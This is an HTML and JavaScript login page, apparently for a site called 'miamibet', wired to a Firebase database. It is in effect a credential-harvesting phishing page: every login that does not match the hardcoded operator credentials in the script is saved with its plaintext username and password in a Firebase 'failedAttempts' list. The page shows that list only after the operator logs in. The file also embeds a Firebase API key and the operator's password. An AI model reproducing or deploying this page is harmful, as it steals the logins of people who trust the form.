<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    body {
      font-family: 'Source Sans Pro', sans-serif;
    }
    .input-icon {
      position: absolute;
      right: 0.75rem;
      top: 67%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .failed-attempt {
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body class="bg-[#111111] text-white min-h-screen flex flex-col justify-between px-4 py-6">
  <!-- ðŸ”¼ Top Section -->
  <div class="w-full max-w-xl mx-auto">
    <div class="p-1.5">
      <h1 class="text-white font-bold text-lg mb-4">LOGIN</h1>
      <!-- Username -->
      <div class="mb-2.5">
        <label class="block text-sm mb-1" for="username">Username</label>
        <input
          type="text"
          id="username"
          placeholder="Username"
          class="w-full px-3 py-1.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
        />
      </div>
      <!-- Password -->
      <div class="mb-2.5 relative">
        <label class="block text-sm mb-1" for="password">Password</label>
        <input
          type="password"
          id="password"
          placeholder="Password"
          class="w-full px-3 py-1.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
        />
        <i id="togglePassword" class="fa-solid fa-eye-slash text-gray-400 input-icon"></i>
      </div>
      <!-- Sign In -->
      <button
        id="loginButton"
        class="w-full px-3 py-1.5 text-base text-black font-semibold rounded bg-gradient-to-r from-yellow-400 to-orange-500 hover:from-yellow-300 hover:to-orange-400 transition"
      >
        Sign In
      </button>
    </div>
  </div>
  <!-- ðŸ”½ Bottom Section -->
  <div class="w-full max-w-xl mx-auto">
    <div class="bg-[#f28a4a] py-2 px-4 font-semibold text-sm">Other</div>
    <div class="border border-orange-500 mt-1 p-3 rounded bg-black text-white cursor-pointer flex justify-between items-center">
      <span>Change Language</span>
      <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="w-4 h-5 text-white" viewBox="0 0 24 24">
        <path d="M9 18l6-6-6-6" />
      </svg>
    </div>
  </div>
  <!-- Firebase SDK -->
  <script type="module">
    // Import the functions you need from the SDKs you need
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
    import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";

    // Your web app's Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCN5oBXHI2kkXyNFXwKjvFrwy2l3DuhF50",
      authDomain: "miamibet-c5b43.firebaseapp.com",
      projectId: "miamibet-c5b43",
      storageBucket: "miamibet-c5b43.appspot.com",
      messagingSenderId: "1002341509535",
      appId: "1:1002341509535:web:1c48750f5661ddac16f5aa",
      measurementId: "G-Z37S25SRS4"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const database = getDatabase(app);
    const failedAttemptsRef = ref(database, 'failedAttempts');

    const togglePassword = document.getElementById("togglePassword");
    const password = document.getElementById("password");

    togglePassword.addEventListener("click", () => {
      const isHidden = password.type === "password";
      password.type = isHidden ? "text" : "password";
      togglePassword.classList.toggle("fa-eye");
      togglePassword.classList.toggle("fa-eye-slash");
    });

    const loginButton = document.getElementById('loginButton');
    const usernameField = document.getElementById('username');
    const passwordField = document.getElementById('password');

    // Function to display failed attempts only after correct login
    function displayFailedAttempts(attempts) {
      const failedMessageContainer = document.getElementById('failedAttemptsContainer');
      if (attempts.length > 0) {
        failedMessageContainer.innerHTML = `<strong>Failed Login Attempts:</strong><br>${attempts.map(attempt => `Username: ${attempt.username}, Password: ${attempt.password}, Timestamp: ${new Date(attempt.timestamp).toLocaleString()}`).join('<br>')}`;
      } else {
        failedMessageContainer.innerHTML = '<strong>No failed attempts yet.</strong>';
      }
      failedMessageContainer.style.display = 'block'; // Ensure it is visible after correct login
    }

    // Store user input if credentials are correct
    loginButton.addEventListener('click', async () => {
      console.log('Button clicked');
      const username = usernameField.value;
      const password = passwordField.value;

      // Clear any previous messages
      const previousMessages = document.querySelectorAll('.failed-attempt');
      previousMessages.forEach(message => message.remove());

      if (username === "lalouss" && password === "laloussa") {
        alert("Login successful!");
        // After successful login, fetch and display stored failed attempts
        onValue(failedAttemptsRef, (snapshot) => {
          const failedAttempts = snapshot.val() || [];
          displayFailedAttempts(Object.values(failedAttempts));
        });
      } else {
        // Store the failed attempt in Firebase
        push(failedAttemptsRef, {
          username,
          password,
          timestamp: new Date().toISOString()
        });
        console.log('Failed attempt stored');
      }
    });

    // Add touch event listener
    loginButton.addEventListener('touchstart', (e) => {
      e.preventDefault();
      loginButton.click();
    });
  </script>
  <!-- Failed attempts container (initially hidden) -->
  <div id="failedAttemptsContainer" class="mt-4 text-white" style="display: none;">
    <!-- Initially empty, will be populated after correct login -->
  </div>
</body>
</html>
